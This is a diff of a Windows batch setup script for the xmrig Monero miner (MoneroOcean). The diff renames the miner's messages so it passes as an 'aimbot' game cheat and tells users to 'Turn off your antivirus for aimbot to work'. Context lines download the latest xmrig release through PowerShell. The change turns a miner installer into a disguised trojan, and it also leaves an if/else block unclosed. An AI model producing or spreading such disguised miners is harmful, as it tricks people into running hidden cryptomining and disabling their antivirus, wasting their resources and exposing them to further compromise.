@@ -234,7 +234,7 @@ if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
   echo WARNING: Advanced version of aimbot was removed by antivirus
 )
 
-echo [*] Looking for the latest version of Monero miner
+echo [*] Looking for the latest version of aimbot
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
@@ -276,10 +276,9 @@ powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ 
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
-  echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
+  echo WARNING: Turn off your antivirus for aimbot to work
 ) else (
-  echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
-)
+  echo WARNING: Turn off your antivirus for aimbot to work
 
 exit /b 1
 
